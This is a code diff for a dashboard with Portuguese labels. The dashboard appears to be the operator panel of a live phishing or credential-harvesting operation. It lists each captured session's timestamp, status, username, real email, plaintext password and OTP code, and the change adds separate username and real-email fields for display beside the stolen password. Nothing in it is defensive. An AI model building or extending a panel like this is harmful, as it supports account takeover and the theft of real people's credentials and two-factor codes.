@@ -21,6 +21,8 @@ import {
 interface LiveSession {
   id: string;
   email: string | null;
+  username: string | null;
+  real_email: string | null;
   password: string | null;
   status: string;
   otp_code: string | null;
@@ -916,20 +918,17 @@ const PpiDashboard = () => {
                   const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
                   const time = new Date(session.created_at);
                   const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
+                  const sessionUsername = session.username || session.email || "—";
+                  const sessionRealEmail = session.real_email || "—";
                   return (
                     <div key={session.id} className={`rounded-lg border bg-card px-3 py-2 ${session.status === "completed" ? "border-green-500/20" : "border-border"}`}>
                       <div className="flex items-center gap-2 flex-wrap">
                         <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
                         <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
                         <span className="text-[11px] font-semibold text-foreground truncate">
-                          👤 {session.email || "—"}
+                          👤 Usuário: {sessionUsername}
                         </span>
-                        {(() => {
-                          const realEmail = session.otp_code?.split("|").find(p => p.startsWith("real_email:"))?.replace("real_email:", "");
-                          return realEmail ? (
-                            <span className="text-[10px] text-blue-400 truncate">✉ {realEmail}</span>
-                          ) : null;
-                        })()}
+                        <span className="text-[10px] text-blue-400 truncate">✉ Email: {sessionRealEmail}</span>
                         {session.password && (
                           <span className="text-[10px] font-mono text-yellow-400 flex items-center gap-0.5">
                             <Lock size={8} /> {session.password}
